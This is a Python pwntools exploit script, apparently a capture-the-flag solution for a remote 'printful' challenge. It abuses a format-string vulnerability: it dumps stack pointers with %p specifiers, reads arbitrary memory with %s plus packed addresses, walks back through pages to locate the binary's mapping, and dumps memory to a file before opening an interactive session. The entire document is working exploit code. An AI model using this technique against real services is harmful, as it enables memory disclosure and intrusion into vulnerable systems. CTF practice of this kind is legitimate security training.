#!/usr/bin/env python3
from pprint import pprint
from pwn import *


def start():
    global io
    io = remote("printful.challs.pwnoh.io", 1337, ssl=True)


def dump_stack(count=0x100):
    payload = "".join([f"%{i}$p." for i in range(1, count + 1)]).encode()
    io.sendlineafter(b"> ", payload)
    return io.recvline().decode().strip().split(".")


def leak_address(addr):
    if b"\n" in p64(addr):
        log.warning(f"Address {addr:#x} contains newline, skipping leak")
        return b""
    io.sendlineafter(b"> ", f"%7$s----".encode() + p64(addr))
    leak = io.recvuntil(b"----")[:-4]
    return leak


def walk_back(start):
    p = log.progress("Walking back memory")
    start = start & ~0xFFF
    offset = 0
    while True:
        p.status(f"Trying address: {start - offset:#x}")
        addr = start - offset
        try:
            io.sendlineafter(b"> ", f"%7$s----".encode() + p64(addr))
        except EOFError:
            break
        offset += 0x1000
    p.success(f"Found offset: {offset:#x}")
    return offset - 0x1000


def leak_continuous(addr, length, filename="leak.bin"):
    p = log.progress(f"Leaking {length} bytes from {addr:#x} to {addr + length:#x}")
    try:
        with open(filename, "rb") as f:
            leaked = f.read()
    except FileNotFoundError:
        leaked = b""
    with open(filename, "ab") as f:
        while len(leaked) < length:
            p.status(f"Leaked {len(leaked)}/{length} bytes")
            chunk = leak_address(addr + len(leaked))
            if len(chunk) == 0:
                chunk = b"\x00"
            leaked += chunk
            f.write(chunk)
            if len(leaked) % 0x100 == 0:
                f.flush()
    return leaked


def main():
    start()
    # pprint(dump_stack(0x100))
    first = dump_stack(1)[0]
    first = int(first, 16)
    base = (first & ~0xFFF) - 0x2000
    leak = leak_continuous(base, 0x5000)
    log.success(f"Leaked data: {leak}")
    io.interactive()


if __name__ == "__main__":
    main()
